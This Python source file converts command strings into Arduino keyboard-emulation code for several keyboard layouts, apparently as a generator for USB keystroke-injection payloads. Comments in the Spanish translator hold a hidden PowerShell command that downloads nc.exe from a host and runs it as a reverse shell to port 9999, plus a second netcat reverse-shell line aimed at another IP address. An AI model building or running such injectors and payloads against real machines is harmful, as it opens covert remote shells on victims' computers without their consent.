import abc
import string

class TranslaterBase:
    __metaclass__ = abc.ABCMeta
    @abc.abstractmethod
    def translate (self, command):
        pass

class TranslaterDummy(TranslaterBase):
    def translate(self, command):
        return command

class TranslaterEnglish(TranslaterBase):
    def translate(self, command):
        return "Keyboard.print(F(\"{0}\"));\n".format(command)

class TranslaterSpanish(TranslaterBase): #TODO pasa 2 veces el codigo por esta funcion, por que?
    def translate(self, command):
        #command = """powershell -W Hidden -NoP -NonI -Exec Bypass \"IEX (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.108/nc.exe','$env:temp\\bob.exe'); $env:temp\\bob.exe 192.168.1.108 9999 -e cmd.exe -d\""""
        #string = """bob.exe 163.10.42.235 9999 -e cmd.exe -d\""""

        spanish = {
            ";":'   Keyboard.press(KEY_RIGHT_SHIFT);    Keyboard.press(\',\');              Keyboard.releaseAll();delay(300); /* ; */\n',
            ":":'   Keyboard.press(KEY_RIGHT_SHIFT);    Keyboard.press(\'.\');              Keyboard.releaseAll();delay(300); /* : */\n',
            "/":'   Keyboard.press(KEY_LEFT_SHIFT);     Keyboard.press(\'7\');              Keyboard.releaseAll();delay(300); /* / */\n',
            "(":'   Keyboard.press(KEY_LEFT_SHIFT);     Keyboard.press(\'8\');              Keyboard.releaseAll();delay(300); /* ( */\n',
            ")":'   Keyboard.press(KEY_LEFT_SHIFT);     Keyboard.press(\'9\');              Keyboard.releaseAll();delay(300); /* ) */\n',
            ">":'   Keyboard.press(KEY_RIGHT_ALT);      Keyboard.press(KEY_RIGHT_SHIFT);    Keyboard.press(\'x\');  Keyboard.releaseAll();delay(300); /* > */\n',
            "\\":'  Keyboard.press(KEY_RIGHT_ALT);      Keyboard.press(\'-\');              Keyboard.releaseAll();delay(300); /* \\ */\n',
            "\"":'  Keyboard.press(KEY_RIGHT_SHIFT);    Keyboard.press(\'2\');              Keyboard.releaseAll();delay(300); /* " */\n',
            #">":'  Keyboard.press(KEY_RIGHT_SHIFT);   Keyboard.press(\'\\\\\');    Keyboard.releaseAll();delay(300); /* > */'
        }
        spanish_simple = {
            "'":'-',
            "-":'/',
        }
        res = ""
        temp = ""
        for s in command:
            #print(s)
            if s in spanish:
                res = res + "Keyboard.print(F(\"{0}\"));\n".format(temp)
                temp = ""
                res = res + spanish[s]
            elif s in spanish_simple:
                temp = temp + spanish_simple[s]
            else:
                temp = temp + s
            #print(res)
        if temp != '':
            res = res + "Keyboard.print(F(\"{0}\"));\n".format(temp)
        print("CODIGOOOOOO")
        print(res)
        return res

class TranslaterUnicode(TranslaterBase):
    def translate(self, command):
        res = ""
        temp = ""
        for c in command:
            if c in string.digits + string.ascii_letters + " ":
                temp += c
            else:
                if temp != '':
                    res = res + "Keyboard.print(F(\"{0}\"));\n".format(temp)
                charcode = hex(ord(c))[2:]
                res += """Keyboard.press(KEY_LEFT_CTRL);  Keyboard.press(KEY_LEFT_SHIFT);  Keyboard.press('u'); Keyboard.releaseAll(); Keyboard.print(F(\"{0}\"));delay(50); Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(100);\n""".format(charcode)
                temp = ""
        if temp != '':
            res = res + "Keyboard.print(F(\"{0}\"));\n".format(temp)
        return res

class TranslaterWindows(TranslaterBase):
    def translate(self, command):
        altcodes = {
            "☺": 1,
            "%": 37,
            "&": 38,
            "(": 40,
            ")": 41,
            "*": 42,
            "+": 43,
            "-": 45,
            "/": 47,
            ":": 58,
            ";": 59,
            "<": 60,
            "=": 61,
            ">": 62,
            "?": 63,
            "@": 64,
            "[": 91,
            "\\": 92,
            "]": 93,
            "^": 94,
            "_": 95,
            "{": 123,
            "|": 124,
            "}": 125,
            "~": 126,
        }
        keypadcodes = {
            "1": 0x59,
            "2": 0x5A,
            "3": 0x5B,
            "4": 0x5C,
            "5": 0x5D,
            "6": 0x5E,
            "7": 0x5F,
            "8": 0x60,
            "9": 0x61,
            "0": 0x62,
        }

        res = ""
        temp = ""
        for c in command:
            #if c in string.digits + string.ascii_letters + " ":
            if c not in altcodes:
                temp += c
            else:
                if temp != '':
                    res = res + "Keyboard.print(F(\"{0}\"));\n".format(temp)
                charcode = str(altcodes[c])
                keyline = "Keyboard.press(KEY_RIGHT_ALT); "
                for n in charcode:
                    keypadcode = hex(keypadcodes[n])
                    keyline += "Keyboard.press({0}); ".format(keypadcode)
                keyline += """  Keyboard.releaseAll();delay(300); /* {0} */\n""".format(c)
                res += keyline
                temp = ""
        if temp != '':
            res = res + "Keyboard.print(F(\"{0}\"));\n".format(temp)
        return res
